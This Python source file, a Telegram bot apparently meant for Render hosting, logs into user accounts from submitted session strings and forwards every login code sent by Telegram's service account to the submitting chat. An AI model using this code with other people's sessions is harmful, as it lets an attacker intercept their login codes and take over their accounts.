import os
import asyncio
from aiohttp import web
from pyrogram import Client, filters
from pyrogram.types import Message

# Render ke Environment Variables se credentials lega
API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

app = Client("otp_receiver_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Active user sessions ko memory mein rakhne ke liye
active_clients = {}

@app.on_message(filters.command("start"))
async def start_command(client, message: Message):
    await message.reply_text(
        "👋 **Welcome!**\n\n"
        "Session se account login karne ke liye bhejein:\n"
        "`/login <your_string_session>`"
    )

@app.on_message(filters.command("login"))
async def login_with_session(client, message: Message):
    if len(message.command) < 2:
        await message.reply_text("❌ Kripya session string bhi dein. Example: `/login YourSessionString`")
        return

    session_string = message.text.split(None, 1)[1].strip()
    admin_chat_id = message.chat.id

    status_msg = await message.reply_text("⏳ Session connect ho raha hai...")

    try:
        user_client = Client(
            name=f"user_{admin_chat_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
            in_memory=True
        )

        await user_client.start()
        user_info = await user_client.get_me()
        active_clients[user_info.id] = user_client

        await status_msg.edit_text(
            f"✅ **Account Login Ho Gaya!**\n\n"
            f"👤 **Name:** {user_info.first_name}\n"
            f"🆔 **ID:** `{user_info.id}`\n"
            f"📱 **Phone:** +{user_info.phone_number}\n\n"
            f"Ab is account par aane wale sare OTPs is bot par aayenge."
        )

        # Official Telegram Service (777000) se aane wale OTP messages ko forward karna
        @user_client.on_message(filters.chat(777000))
        async def capture_otp(u_client, otp_msg: Message):
            if otp_msg.text:
                await client.send_message(
                    chat_id=admin_chat_id,
                    text=f"🚨 **New OTP Received!**\n\n📱 Account: `+{user_info.phone_number}`\n\n{otp_msg.text}"
                )

    except Exception as e:
        await status_msg.edit_text(f"❌ **Login Fail:**\n`{str(e)}`")

# Render ke liye dummy web server (Port binding ke liye zaroori)
async def handle(request):
    return web.Response(text="Bot is running on Render!")

async def start_web_server():
    web_app = web.Application()
    web_app.router.add_get("/", handle)
    runner = web.AppRunner(web_app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

async def main():
    await start_web_server()
    await app.start()
    print("Bot and Web Server started successfully!")
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
  
